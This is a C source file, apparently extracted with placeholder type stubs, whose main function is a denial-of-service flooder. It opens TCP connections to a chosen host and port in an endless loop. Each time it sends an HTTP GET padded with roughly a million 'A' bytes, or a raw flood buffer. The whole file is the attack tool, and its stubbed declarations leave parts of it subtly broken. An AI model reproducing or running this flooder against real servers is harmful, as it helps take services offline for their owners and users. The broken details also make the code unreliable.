
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {int sin_port; TYPE_1__ sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int s ;
struct TYPE_4__ {int sizes; int x; scalar_t__ sockets; int recvbytes; scalar_t__ sendbytes; int option; int port; int host; } ;


 int AF_INET ;
 int BUFFSZ ;
 int GET1 ;
 int GET2 ;
 int IPPROTO_TCP ;
 int SOCK_STREAM ;
 char* TITLE ;
 scalar_t__ connect (scalar_t__,struct sockaddr*,int) ;
 int copy_str (scalar_t__,int ,int) ;
 int error_handle () ;
 int get_arguments (int,char**) ;
 int htons (int ) ;
 int inet_addr (int ) ;
 int memset (int ,int ,int ) ;
 int mset (scalar_t__,int,int) ;
 int printf (char*,...) ;
 int recv (scalar_t__,int ,int ,int ) ;
 scalar_t__ send (scalar_t__,scalar_t__,int,int ) ;
 int shutdown (scalar_t__,int) ;
 scalar_t__ socket (int ,int ,int ) ;
 scalar_t__ strcmp (int ,char*) ;
 TYPE_2__ use ;

int main(int argc,char** argv){
      printf("%s",TITLE);
            get_arguments(argc,argv);
            struct sockaddr_in s;
            use.sizes=sizeof(s);
            s.sin_family=AF_INET;
            s.sin_addr.s_addr=inet_addr(use.host);
            s.sin_port=htons(use.port);
               printf("[*]connection established\n");
      printf("[*]Sending packets!\n");
           for(;;){
                use.x++;
                         use.sockets = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
          if (use.sockets < 0){
          printf("line 81");
                         error_handle();
                        }
         if (strcmp(use.option, "get") == 0){
         copy_str(use.sendbytes, GET1, 5);
         mset(use.sendbytes+5,0x41,999999);
         copy_str(use.sendbytes+5+999999, GET2, 17);
                        }else{
         if(strcmp(use.option,"flood")==0){
           mset(use.sendbytes+5,0x41,999999);
         }
      }
                       if(connect(use.sockets,(struct sockaddr*)&s,use.sizes)<0){
          printf("Nr of connections:%d\nline 89:",use.x);
                error_handle();
        }else{
        printf(".");
         }

                       if(send(use.sockets,use.sendbytes,sizeof(use.sendbytes),0)<0){
          printf("Nr of sends:\nline 96:",use.x);
                         error_handle();
                         shutdown(use.sockets,1);
                       }else{
        memset(use.recvbytes,0,BUFFSZ);
        recv(use.sockets,use.recvbytes,BUFFSZ,0);
         }

       }
             printf("[*]Done!\n");
       return 0;
      }
